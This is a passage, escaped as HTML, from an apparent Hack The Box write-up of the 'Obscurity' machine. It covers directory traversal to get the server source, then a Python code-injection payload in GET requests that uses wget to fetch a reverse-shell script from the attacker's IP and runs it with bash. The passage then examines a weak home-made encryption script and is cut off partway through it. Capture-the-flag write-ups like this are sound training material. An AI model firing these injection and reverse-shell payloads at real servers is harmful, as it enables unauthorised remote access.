|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;css/templatemo-blue.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
|     &amp;lt;/head&amp;gt;                                             
|     &amp;lt;body data-spy&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scroll&quot;&lt;/span&gt; data-target&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.navbar-collapse&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; preloader section &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                     
|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;                                                                                                           
|     &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;preloader&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     
|_    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sk-spinner sk-spinner-wordpress&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                  
|_http-server-header: BadHTTPServer        
|_http-title: 0bscura                                     
9000/tcp closed cslistener
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;TRUNCATED]
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel         
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;

&lt;p&gt;Looking at the web application on port 8080, we see it serving an interesting page.
&lt;img src=&quot;\assets\images\htb\obscurity\obscurity-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Scrolling down a bit and we find an interesting statement. They leave a message to the server devs, giving the source code file name to the webserver. Let’s see if we can locate this file.
&lt;img src=&quot;\assets\images\htb\obscurity\obscurity-webdev.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Doing a simple directory traversal through Burp Suite allowed us to grab the source code of the web server.
&lt;img src=&quot;\assets\images\htb\obscurity\obscurity-webdev-traverse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Examining the source code further, we see a dangerous exec() call on the url path. Let’s exploit this.
&lt;img src=&quot;\assets\images\htb\obscurity\obscurity-websource.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Setting up tcpdump to listen for icmp, I was able to get a ping back with the following subprocess call.
&lt;img src=&quot;\assets\images\htb\obscurity\obscurity-websubprocess.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://www.securitynewspaper.com/2016/11/12/exploiting-python-code-injection-web-applications/&quot; target=&quot;_blank&quot;&gt;Exploiting Python Code Injection in Web Applications&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;With this, I created a simple bash reverse shell script and used wget to upload it to /tmp on the machine. Then I used the vulnerable function once again to execute the script. This returned a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;. There is probably a more elegant way, but I didn’t want to overcomplicate it.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET /'+%2b+subprocess.call(['wget','10.10.14.34/rev.sh','-O','tmp/rev.sh'])+%2b+' HTTP/1.1&lt;/code&gt;&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET /'+%2b+subprocess.call(['bash','tmp/rev.sh'])+%2b+' HTTP/1.1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;One of the first things I noticed is that we can read Robert’s home directory as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; and he has quite a few interesting files.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/robert
total 60
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root   root   4096 Sep 24  2019 ..
lrwxrwxrwx 1 robert robert    9 Sep 28  2019 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 robert robert  220 Apr  4  2018 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 robert robert 3771 Apr  4  2018 .bashrc
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
drwx------ 2 robert robert 4096 Oct  3  2019 .cache
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 robert robert   94 Sep 26  2019 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3  2019 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3  2019 .local
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 robert robert  185 Oct  4  2019 out.txt
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 robert robert   27 Oct  4  2019 passwordreminder.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 robert robert  807 Apr  4  2018 .profile
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
&lt;span class=&quot;nt&quot;&gt;-rwx------&lt;/span&gt; 1 robert robert   33 Sep 25  2019 user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;What I found is that there is a script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SuperSecureCrypt.py&lt;/code&gt; that is used to “encrypt” a file with a “key”. Robert left has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwordreminder.txt&lt;/code&gt; file, and conveniently, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check.out&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;out.txt&lt;/code&gt; file. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;out.txt&lt;/code&gt; contains the encrypted output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check.txt&lt;/code&gt;. This will allow us to potentially reverse the encryption and get his key, which we can use to decrypt his password reminder file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\htb\obscurity\robert-files.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SuperSecureCrypt.py&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;argparse&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;keylen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyChr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keylen&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;keylen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyChr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keylen&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Encrypt with 0bscura&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s encryption algorithm'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'InFile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'The file to read'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-o'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'OutFile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Where to output the encrypted/decrypted file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-k'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Key to use'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'store_true'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Decrypt mode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;################################&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;#           BEGINNING          #&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;#    SUPER SECURE ENCRYPTOR    #&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;################################&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  ############################&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  #        FILE MODE         #&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  ############################&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Missing args&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Opening file {0}...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Decrypting...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
